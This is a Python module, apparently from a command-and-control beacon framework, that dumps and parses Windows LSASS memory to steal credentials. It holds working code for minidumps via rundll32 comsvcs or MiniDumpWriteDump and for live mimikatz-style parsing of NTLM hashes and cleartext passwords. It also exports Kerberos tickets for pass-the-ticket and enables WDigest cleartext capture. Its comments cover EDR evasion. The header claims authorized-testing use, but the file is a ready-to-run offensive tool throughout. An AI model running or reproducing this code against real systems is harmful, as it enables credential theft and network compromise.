"""LSASS process memory dumper.

============================================================
AUTHORIZED SECURITY TESTING / EDUCATION USE ONLY.
============================================================

This module produces a Windows minidump of the LSASS process. The resulting
.dmp can be parsed off-target with pypykatz to recover:

  * WDigest cleartext passwords (when WDigest credSSP is enabled)
  * NTLM password hashes
  * Kerberos TGT / TGS tickets
  * LM hashes (when LM hash storage is enabled)
  * DPAPI master keys (depending on dump completeness)
  * Credential Manager credentials of the calling user

This is the same capability mimikatz's ``sekurlsa::minidump`` provides. It is
gated to Windows hosts and requires the beacon to be running with admin
rights (SeDebugPrivilege) -- which on a non-admin host means it will fail
loudly instead of silently.

Two dump strategies are implemented:

  1. ``comsvcs``  -- invoke ``rundll32 comsvcs.dll, MiniDump <pid> <out> full``.
     The OS's own signed binary does the dump. This is what mimikatz uses
     by default and what is least visible to EDR heuristics that watch for
     dbghelp.dll loads.

  2. ``ctypes``   -- load ``dbghelp.dll`` and call ``MiniDumpWriteDump``
     directly. More flexible (any target process, custom flags) but
     noisier; most EDRs flag dbghelp+MiniDumpWriteDump on lsass.exe.

After dumping, transfer the file off-target (use ``upload`` + ``download``
or the operator-side ``scp``). Parse on the operator host:

    python3 -m pypykatz lsadump lsass.dmp
    # or
    cscli --parse-lsass lsass.dmp

Reference: ATT&CK T1003.001 (OS Credential Dumping: LSASS Memory).
"""
import os
import shutil
import subprocess
import sys


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _is_windows():
    return os.name == "nt"


def _resolve_lsass_pid():
    """Find lsass.exe PID via tasklist (no WMI / pywin32 dependency)."""
    if not _is_windows():
        return None
    try:
        out = subprocess.run(
            ["tasklist", "/FI", "IMAGENAME eq lsass.exe", "/NH", "/FO", "CSV"],
            capture_output=True, text=True, timeout=10).stdout
    except Exception:
        return None
    for line in out.splitlines():
        parts = [p.strip().strip('"') for p in line.split(",")]
        if len(parts) >= 2 and parts[0].lower() == "lsass.exe":
            try:
                return int(parts[1])
            except ValueError:
                continue
    return None


# ---------------------------------------------------------------------------
# Public API (mirrors cs/modules/*.py convention used by beacon.do_<cmd>)
# ---------------------------------------------------------------------------
def dump_lsass(out_path, prefer="comsvcs"):
    """Dump LSASS process memory to a minidump file.

    Args:
        out_path: target path on the beacon host (absolute or relative to
                  beacon's cwd). File must be on a writable volume.
        prefer:   "comsvcs" (default; uses rundll32 + the OS-signed
                  comsvcs.dll MiniDump export) or "ctypes" (direct
                  MiniDumpWriteDump via dbghelp.dll).

    Returns:
        (ok, message) -- message is the path on success, or an error string.
    """
    if not _is_windows():
        return False, "lsass dump only runs on Windows hosts"

    pid = _resolve_lsass_pid()
    if pid is None:
        return False, "could not locate lsass.exe (is the host Windows?)"

    out_path = os.path.abspath(out_path)
    try:
        parent = os.path.dirname(out_path) or "."
        if not os.path.isdir(parent):
            os.makedirs(parent, exist_ok=True)
    except OSError:
        pass

    if prefer == "comsvcs":
        return _dump_via_comsvcs(pid, out_path)
    if prefer == "ctypes":
        return _dump_via_ctypes(pid, out_path)
    return False, f"unknown prefer={prefer!r}; use 'comsvcs' or 'ctypes'"


def parse_dump(dmp_path):
    """Parse an LSASS minidump file with pypykatz. Operator-side utility.

    pypykatz is an optional dependency. If it's not importable, we surface
    a clean error rather than crash, so the beacon can still produce the
    .dmp and the operator can parse it on a host that has pypykatz.

    The DumpFile is parsed with ``apypykatz.parse_minidump_file`` (which is
    async — we drive it with ``asyncio.run``). This runs from either the
    operator host or a PyInstaller-built beacon that bundles pypykatz.

    Returns:
        (ok, text_report)
        The report includes the parsed credential types (not the decoded
        secrets) — a grep-friendly summary intended to confirm the dump is
        parseable before you pull it off-target and do a full decode.
    """
    try:
        from pypykatz.apypykatz import apypykatz
    except ImportError:
        return False, ("pypykatz not installed. Run on the operator host:\n"
                       "    pip install pypykatz\n"
                       "    python3 -m pypykatz lsadump <file>\n"
                       "or:  cscli parse-lsass <file>  (if pypykatz is on PATH)")
    if not os.path.exists(dmp_path):
        return False, f"dump file not found: {dmp_path}"
    try:
        import asyncio
        katz = asyncio.run(apypykatz.parse_minidump_file(dmp_path))
    except Exception as e:
        import traceback
        return False, f"pypykatz parse failed: {e}\n{traceback.format_exc(limit=3)}"

    lines = []
    for luid, sess in getattr(katz, "logon_sessions", {}).items():
        uname = sess.username or "?"
        dom = sess.domainname or "?"
        lines.append(f"== {dom}\\{uname}  (luid={luid}) ==")
        for ssp, attr in (
            ("msv", "msv_creds"), ("wdigest", "wdigest_creds"),
            ("kerberos", "kerberos_creds"), ("tspkg", "tspkg_creds"),
            ("ssp", "ssp_creds"), ("livessp", "livessp_creds"),
            ("dpapi", "dpapi_creds"), ("cloudap", "cloudap_creds"),
        ):
            creds = getattr(sess, attr, [])
            if creds:
                lines.append(f"  {ssp}: {len(creds)} principal(s)")
        lines.append("")
    if not lines:
        lines = ["(no logon sessions found in dump)"]
    return True, "\n".join(lines)


# ---------------------------------------------------------------------------
# sekurlsa::logonpasswords  --  live LSASS parsing, no dump file.
#
# This is mimikatz's sekurlsa::logonpasswords reimplemented in Python via
# pypykatz. It opens the live lsass.exe process (PROCESS_ALL_ACCESS after
# enabling SeDebugPrivilege), reads SSP memory regions directly via
# VirtualQueryEx + ReadProcessMemory (all wrapped by pypykatz), and runs the
# msv / wdigest / kerberos / tspkg / ssp / livessp / dpapi / cloudap
# decryptors against that memory image. No .dmp file is written to disk --
# the parsed credentials go straight back to the operator.
#
# IMPORTANT prerequisites:
#   * Windows host
#   * Python 64-bit on a 64-bit Windows, or 32-bit on 32-bit (pypykatz's
#     sanity check enforces this -- you can't read 64-bit lsass from 32-bit
#     python).
#   * The beacon (or operator host) is a member of the local Administrators
#     group. Without it, OpenProcess(lsass) returns ERROR_ACCESS_DENIED.
#   * LSASS must NOT be running as a Protected Process Light (PPL) target.
#     On Win 11 22H2+ with Credential Guard enabled, you must first
#     disable Credential Guard (group policy / registry) or use a kernel
#     driver to strip the protection -- out of scope here.
#
# The beacon payload generated by `cscli --payload` is stdlib-only and does
# NOT bundle pypykatz; sekurlsa will return "pypykatz not importable" from
# such a payload. Build a PyInstaller beacon (`./scripts/build-binary.sh`)
# on a host where pypykatz is installed to get a self-contained binary that
# can run sekurlsa against itself.
# ---------------------------------------------------------------------------
def sekurlsa_logonpasswords(packages="all", pid=None, no_lsa=False,
                            export_dir=None, export_ccache=None):
    """Live-parse LSASS SSPs in-memory. Returns (ok, text_report).

    Args:
        packages:  list / tuple / comma string of which SSPs to parse.
                   Defaults to "all" (= msv, wdigest, kerberos, tspkg, ssp,
                   livessp, dpapi, cloudap). Pass a subset to skip slow ones.
        pid:       target PID. If None, auto-resolve "lsass.exe".
        no_lsa:    if True, skip the LSA template / decryption key step.
                   Faster but you lose the decryption keys needed for
                   WDigest / Kerberos / TSPKG / SSP / LiveSSP cleartext.
                   Only MSV (NT/LM hashes) survives.
        export_dir:  if set, write each recovered Kerberos ticket as a
                   ``.kirbi`` file into this directory (pass-the-ticket).
        export_ccache:  if set, write all recovered tickets into a single
                   MIT ccache file at this path.
    """
    if not _is_windows():
        return False, "sekurlsa::logonpasswords only runs on Windows hosts"

    if isinstance(packages, str):
        pkgs = [p.strip() for p in packages.split(",") if p.strip()]
    else:
        pkgs = list(packages)
    if not pkgs:
        pkgs = ["all"]

    # If the operator wants tickets, force the kerberos SSP on and remember it.
    want_tickets = bool(export_dir or export_ccache)
    if want_tickets and "kerberos" not in pkgs and "all" not in pkgs \
            and "ktickets" not in pkgs:
        pkgs.append("kerberos")

    try:
        # pypykatz internals: the bundled `pypykatz live` CLI is a stub in
        # 0.6.13, but the underlying LiveReader + apypykatz components work
        # and that's the documented way to drive live parsing.
        from pypykatz.commons.readers.local.live_reader import LiveReader
        from pypykatz.commons.common import KatzSystemInfo
        from pypykatz.apypykatz import apypykatz
    except ImportError as e:
        return False, (f"pypykatz not importable in this Python environment "
                       f"({e}).\n"
                       "  On the operator host:  pip install pypykatz\n"
                       "  On a beacon host:      rebuild the PyInstaller "
                       "binary on a host with pypykatz installed:\n"
                       "      pip install pypykatz\n"
                       "      ./scripts/build-binary.sh windows64")

    # LiveReader.setup() will:
    #   * enable_debug_privilege()  -> enable SeDebugPrivilege
    #   * OpenProcess(PROCESS_ALL_ACCESS) on the target
    #   * EnumProcessModules + GetModuleFileNameExW -> enumerate lsass modules
    #   * VirtualQueryEx over the full address space -> enumerate pages
    # All of that raises on a non-admin host or on a PPL-protected lsass.
    try:
        if pid is not None:
            lr = LiveReader(process_pid=int(pid))
        else:
            lr = LiveReader(process_name="lsass.exe")
    except Exception as e:
        return False, f"LiveReader setup failed (need admin; LSASS may be PPL): {e}"

    try:
        sysinfo = KatzSystemInfo.from_live_reader(lr)
    except Exception as e:
        return False, f"sysinfo build failed: {e}"

    reader = lr.get_buffered_reader()

    # apypykatz.start() is async (pypykatz uses asyncio internally).
    # Drive it from sync code with asyncio.run().
    import asyncio
    mimi = apypykatz(reader, sysinfo)
    try:
        if no_lsa:
            # Skip LSA decryptor: MSV (NT/LM hash) survives, but WDigest /
            # Kerberos / SSP / LiveSSP / TSPKG cleartext needs the LSA
            # session key which we won't have.
            asyncio.run(mimi.get_logoncreds())
        else:
            asyncio.run(mimi.start(pkgs))
    except Exception as e:
        return False, f"apypykatz.start failed: {e}"

    # ---- Kerberos ticket recovery -------------------------------------
    # apypykatz.get_kerberos() hard-codes with_tickets=False (upstream marks
    # it "not working"). When the operator asked for tickets, drive
    # KerberosDecryptor directly with with_tickets=True and collect the
    # kirbi blobs. This needs the LSA session key, so it only runs when
    # no_lsa is False and lsa_decryptor is available.
    kirbi_blobs = {}   # filename -> bytes
    if want_tickets and not no_lsa and getattr(mimi, "lsa_decryptor", None):
        try:
            from pypykatz.lsadecryptor.packages.kerberos.templates import \
                KerberosTemplate
            from pypykatz.lsadecryptor.packages.kerberos.decryptor import \
                KerberosDecryptor
            dec_template = KerberosTemplate.get_template(sysinfo)
            kdec = KerberosDecryptor(reader, dec_template, mimi.lsa_decryptor,
                                     sysinfo, with_tickets=True)
            asyncio.run(kdec.start())
            for cred in kdec.credentials:
                for ticket in getattr(cred, "tickets", []):
                    for fn, blob in getattr(ticket, "kirbi_data", {}).items():
                        try:
                            kirbi_blobs[fn] = blob.dump()
                        except AttributeError:
                            kirbi_blobs[fn] = bytes(blob)
        except Exception as e:
            # Non-fatal: report the ticket-recovery failure but keep the rest.
            mimi.errors.append(("ktickets", e))

    export_msgs = []
    if kirbi_blobs and export_dir:
        os.makedirs(export_dir, exist_ok=True)
        for fn, blob in kirbi_blobs.items():
            safe = fn.replace("/", "_").replace("\\", "_")
            path = os.path.join(export_dir, safe)
            try:
                with open(path, "wb") as f:
                    f.write(blob)
                export_msgs.append(f"wrote {path} ({len(blob)} bytes)")
            except OSError as e:
                export_msgs.append(f"failed to write {path}: {e}")
    if kirbi_blobs and export_ccache:
        try:
            from minikerberos.common.ccache import CCACHE
            from minikerberos.common.kirbi import Kirbi
            cc = CCACHE()
            for fn, blob in kirbi_blobs.items():
                cc.add_kirbi(Kirbi.from_bytes(blob))
            cc.to_file(export_ccache)
            export_msgs.append(f"wrote ccache {export_ccache} "
                               f"({len(kirbi_blobs)} ticket(s))")
        except Exception as e:
            export_msgs.append(f"ccache export failed: {e}")

    report = format_sekurlsa(mimi)
    if want_tickets:
        report += "\n\n== Kerberos ticket export ==\n"
        if kirbi_blobs:
            report += f"recovered {len(kirbi_blobs)} ticket(s)\n"
        else:
            report += ("no tickets recovered (none cached, or ktickets "
                       "parsing failed)\n")
        for m in export_msgs:
            report += f"  {m}\n"
    return True, report


def format_sekurlsa(mimi):
    """Render an apypykatz result in mimikatz sekurlsa::logonpasswords style.

    Output mirrors the visual style of `mimikatz sekurlsa::logonpasswords`
    so operators used to mimikatz get a familiar report:

        Authentication Id : 0;996
        Session           : Service
        User Name         : svc_sql
        Domain            : CONTOSO
        Logon Server      : DC01
        Logon Time        : 1/15/2025 10:30:45
        SID               : S-1-5-...

                msv :
                 [00000003] Primary
                 * Username : svc_sql
                 * Domain   : CONTOSO
                 * NTLM     : aad3b...

                wdigest :
                 * Username : svc_sql
                 * Password : (null)

                kerberos :
                 * Username : svc_sql
                 ...
    """
    import datetime as _dt
    out = ["sekurlsa::logonpasswords", "=" * 60]

    if not mimi.logon_sessions:
        out.append("(no active logon sessions found in lsass memory)")

    for luid, sess in mimi.logon_sessions.items():
        auth_id = sess.authentication_id or luid
        try:
            auth_id_str = f"{auth_id};{int(luid):x}" if luid else str(auth_id)
        except (ValueError, TypeError):
            auth_id_str = str(auth_id)
        logon_time = sess.logon_time
        if isinstance(logon_time, _dt.datetime):
            logon_time = logon_time.strftime("%Y-%m-%d %H:%M:%S")
        elif logon_time is None:
            logon_time = "(unknown)"

        out.append("")
        out.append(f"Authentication Id : {auth_id_str}")
        out.append(f"Session           : {sess.session_id or '(unknown)'}")
        out.append(f"User Name         : {sess.username or '(unknown)'}")
        out.append(f"Domain            : {sess.domainname or '(unknown)'}")
        out.append(f"Logon Server      : {sess.logon_server or '(unknown)'}")
        out.append(f"Logon Time        : {logon_time}")
        out.append(f"SID               : {sess.sid or '(unknown)'}")
        out.append("")
        # Each SSP block.
        for ssp_name, creds_attr in (
            ("msv",      "msv_creds"),
            ("wdigest",  "wdigest_creds"),
            ("kerberos", "kerberos_creds"),
            ("tspkg",    "tspkg_creds"),
            ("ssp",      "ssp_creds"),
            ("livessp",  "livessp_creds"),
            ("dpapi",    "dpapi_creds"),
            ("cloudap",  "cloudap_creds"),
            ("credman",  "credman_creds"),
        ):
            creds = getattr(sess, creds_attr, [])
            if not creds:
                continue
            out.append(f"\t{ssp_name} :")
            for c in creds:
                d = c.to_dict() if hasattr(c, "to_dict") else {}
                if ssp_name == "msv":
                    out.append(f"\t [{d.get('credtype') or 'Primary'}]")
                _emit_msv(out, d) if ssp_name == "msv" else _emit_kv(out, d)
                out.append("")
        out.append("")

    if mimi.orphaned_creds:
        out.append("== Orphaned credentials ==")
        for cred in mimi.orphaned_creds:
            d = cred.to_dict() if hasattr(cred, "to_dict") else {}
            out.append(f"  [{d.get('credtype', '?')}] "
                       f"{d.get('domainname', '?')}\\{d.get('username', '?')}")
            for k, v in d.items():
                if k in ("credtype", "username", "domainname"):
                    continue
                if v not in (None, "", b""):
                    out.append(f"      {k}: {v}")
        out.append("")

    if mimi.errors:
        out.append("== Errors ==")
        for pkg, err in mimi.errors:
            out.append(f"  [{pkg}] {err}")
        out.append("")

    return "\n".join(out)


def _emit_kv(lines, d):
    """Render a credential dict as '* key : value' lines, skipping blanks."""
    d2 = dict(d)
    d2.pop("credtype", None)
    label_map = {
        "username":       "Username",
        "domainname":     "Domain",
        "password":       "Password",
        "NThash":         "NTLM",
        "LMHash":         "LM",
        "SHAHash":        "SHA1",
        "DPAPI":          "DPAPI",
        "masterkey":      "MasterKey",
        "sha1_masterkey": "SHA1 MasterKey",
        "key_guid":       "Key GUID",
    }
    for k, v in d2.items():
        if v in (None, "", b"", []):
            continue
        lines.append(f"\t * {label_map.get(k, k):14s}: {v}")


def _emit_msv(lines, d):
    """Special-case MSV creds to surface NT/LM/SHA1 hashes first."""
    order = ["username", "domainname", "LMHash", "NThash", "SHAHash",
             "DPAPI", "isoProt"]
    d2 = dict(d)
    d2.pop("credtype", None)   # already shown in the [credtype] header line
    label_map = {
        "username":   "Username",
        "domainname": "Domain",
        "LMHash":     "LM",
        "NThash":     "NTLM",
        "SHAHash":    "SHA1",
        "DPAPI":      "DPAPI",
        "isoProt":    "ISO Prot",
    }
    for k in order:
        if k in d2 and d2[k] not in (None, "", b""):
            lines.append(f"\t * {label_map[k]:14s}: {d2[k]}")
            del d2[k]
    for k, v in d2.items():
        if v not in (None, "", b""):
            lines.append(f"\t * {k:14s}: {v}")


def enable_wdigest(disable=False):
    """Toggle WDigest cleartext-credential storage (UseLogonCredential).

    mimikatz workflow: set ``UseLogonCredential = 1``, wait for a user to
    re-authenticate, then run ``sekurlsa::logonpasswords`` to recover the
    cleartext password. This helper performs step 1.

    Writes ``HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\
    UseLogonCredential`` (DWORD). 1 = store cleartext in memory (enable),
    0 = do not store (the modern Windows default, disable).

    Requires:
      * Windows host
      * Administrator (HKLM write access)

    Returns:
        (ok, msg)
    """
    if not _is_windows():
        return False, "enable_wdigest only runs on Windows hosts"
    try:
        import winreg
    except ImportError:
        return False, "winreg not available (not Windows?)"

    key_path = r"SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
    value = 0 if disable else 1
    try:
        key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, key_path,
                                 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
        winreg.SetValueEx(key, "UseLogonCredential", 0, winreg.REG_DWORD, value)
        winreg.CloseKey(key)
    except PermissionError:
        return False, "access denied writing HKLM (run as admin)"
    except OSError as e:
        return False, f"registry write failed: {e}"

    if disable:
        return True, ("WDigest cleartext storage DISABLED (UseLogonCredential=0). "
                      "New logons will not leave cleartext passwords in LSASS.")
    return True, ("WDigest cleartext storage ENABLED (UseLogonCredential=1). "
                  "Cleartext passwords will be captured on the NEXT interactive/"
                  "network logon -- re-login (or wait for a service auth) before "
                  "running sekurlsa to harvest them.")


def wdigest_status():
    """Read the current WDigest UseLogonCredential value.

    Returns (ok, msg) where msg describes the current setting.
    """
    if not _is_windows():
        return False, "wdigest_status only runs on Windows hosts"
    try:
        import winreg
    except ImportError:
        return False, "winreg not available (not Windows?)"
    key_path = r"SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path,
                             0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
        val, _ = winreg.QueryValueEx(key, "UseLogonCredential")
        winreg.CloseKey(key)
    except FileNotFoundError:
        return True, ("UseLogonCredential not set (default=0, cleartext "
                      "storage DISABLED on Win8.1+/Server2012R2+)")
    except PermissionError:
        return False, "access denied reading HKLM (run as admin)"
    except OSError as e:
        return False, f"registry read failed: {e}"
    state = "ENABLED" if val == 1 else "DISABLED"
    return True, f"UseLogonCredential={val} -> WDigest cleartext storage {state}"


# ---------------------------------------------------------------------------
# Strategy 1: comsvcs!MiniDump via rundll32
# ---------------------------------------------------------------------------
def _dump_via_comsvcs(pid, out_path):
    """rundll32 comsvcs.dll, MiniDump <pid> <out.dmp> full.

    comsvcs.dll ships with every modern Windows install and is signed by MS,
    so this avoids loading dbghelp into the beacon process. The beacon's
    current token must have PROCESS_QUERY_INFORMATION on lsass -- which a
    member of the local Administrators group does (because LSASS grants
    Administrators full access by default).
    """
    system_root = os.environ.get("SystemRoot", r"C:\Windows")
    comsvcs = os.path.join(system_root, "System32", "comsvcs.dll")
    if not os.path.exists(comsvcs):
        return False, f"comsvcs.dll not found at {comsvcs}"

    # rundll32 takes args after a comma: rundll32 <dll>,<entry> <args...>
    # MiniDump signature:  MiniDump(DWORD pid, LPCWSTR file, DWORD flags)
    cmd = ["rundll32.exe", comsvcs, "MiniDump", str(pid), out_path, "full"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    except subprocess.TimeoutExpired:
        return False, "comsvcs MiniDump timed out (>120s)"

    if not os.path.exists(out_path):
        return False, ("MiniDump did not produce output file. "
                       "rc=" + str(r.returncode) +
                       (" stderr=" + (r.stderr or "").strip() if r.stderr else ""))
    return True, out_path


# ---------------------------------------------------------------------------
# Strategy 2: direct MiniDumpWriteDump via ctypes
# ---------------------------------------------------------------------------
def _dump_via_ctypes(pid, out_path):
    """Load dbghelp.dll and call MiniDumpWriteDump(pid, pid, hFile,
    MiniDumpWithFullMemory, ...).

    Requires SeDebugPrivilege on the current process token. We enable it
    best-effort; if it can't be enabled (non-admin host), the OpenProcess
    call will fail with ERROR_ACCESS_DENIED.
    """
    if not _enable_se_debug():
        return False, "failed to enable SeDebugPrivilege (run as admin)"

    import ctypes
    from ctypes import wintypes as wt

    kernel32 = ctypes.WinDLL("kernel32.dll")
    dbghelp = ctypes.WinDLL("dbghelp.dll")

    MiniDumpWriteDump = dbghelp.MiniDumpWriteDump
    MiniDumpWriteDump.argtypes = [
        wt.DWORD, wt.DWORD, ctypes.c_void_p, wt.DWORD, ctypes.c_void_p,
        ctypes.c_void_p, ctypes.c_void_p,
    ]
    MiniDumpWriteDump.restype = wt.BOOL

    # OpenProcess access: VM_READ + QUERY_INFORMATION + QUERY_LIMITED
    access = 0x0010 | 0x0400 | 0x1000   # VM_READ | QUERY_INFORMATION | QUERY_LIMITED
    hProc = kernel32.OpenProcess(access, False, pid)
    if not hProc:
        return False, (f"OpenProcess(lsass pid={pid}) failed: "
                       f"err={ctypes.get_last_error()} (need admin / SeDebugPrivilege)")

    GENERIC_WRITE = 0x40000000
    CREATE_ALWAYS = 2
    FILE_ATTRIBUTE_NORMAL = 0x80
    INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value

    hFile = kernel32.CreateFileW(out_path, GENERIC_WRITE, 0, None,
                                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
    if not hFile or hFile == INVALID_HANDLE_VALUE:
        err = ctypes.get_last_error()
        kernel32.CloseHandle(hProc)
        return False, f"CreateFileW({out_path}) failed: err={err}"

    try:
        # MiniDumpWithFullMemory = 0x00000002 (also pulls hidden protected
        # process memory; what mimikatz uses by default)
        ok = MiniDumpWriteDump(pid, pid, hFile, 0x00000002, None, None, None)
        if not ok:
            return False, (f"MiniDumpWriteDump failed: err={ctypes.get_last_error()} "
                           f"(often means an AV/EDR blocked the handle)")
    finally:
        kernel32.CloseHandle(hFile)
        kernel32.CloseHandle(hProc)

    if not os.path.exists(out_path):
        return False, "MiniDumpWriteDump returned ok but no file was produced"
    return True, out_path


def _enable_se_debug():
    """Best-effort: enable SeDebugPrivilege on the current process token.

    Returns True if the privilege is now enabled. Returns False on non-admin
    hosts (the typical case where OpenProcess on lsass later fails).
    """
    try:
        import ctypes
        from ctypes import wintypes as wt
    except Exception:
        return False

    advapi32 = ctypes.WinDLL("advapi32.dll")
    kernel32 = ctypes.WinDLL("kernel32.dll")

    class LUID(ctypes.Structure):
        _fields_ = [("LowPart", wt.DWORD), ("HighPart", wt.LONG)]

    class LUID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [("Luid", LUID), ("Attributes", wt.DWORD)]

    class TOKEN_PRIVILEGES(ctypes.Structure):
        _fields_ = [("PrivilegeCount", wt.DWORD),
                    ("Privileges", LUID_AND_ATTRIBUTES * 1)]

    TOKEN_ADJUST_PRIVILEGES = 0x0020
    TOKEN_QUERY = 0x0008
    SE_PRIVILEGE_ENABLED = 0x02

    hToken = wt.HANDLE()
    if not kernel32.OpenProcessToken(kernel32.GetCurrentProcess(),
                                     TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                                     ctypes.byref(hToken)):
        return False

    luid = LUID()
    if not advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege",
                                          ctypes.byref(luid)):
        kernel32.CloseHandle(hToken)
        return False

    tp = TOKEN_PRIVILEGES()
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

    AdjustTokenPrivileges = advapi32.AdjustTokenPrivileges
    AdjustTokenPrivileges.argtypes = [wt.HANDLE, wt.BOOL, ctypes.c_void_p,
                                      wt.DWORD, ctypes.c_void_p, ctypes.c_void_p]
    AdjustTokenPrivileges.restype = wt.BOOL

    ok = AdjustTokenPrivileges(hToken, False, ctypes.byref(tp),
                               0, None, None)
    err = ctypes.get_last_error()
    kernel32.CloseHandle(hToken)
    return bool(ok) and err == 0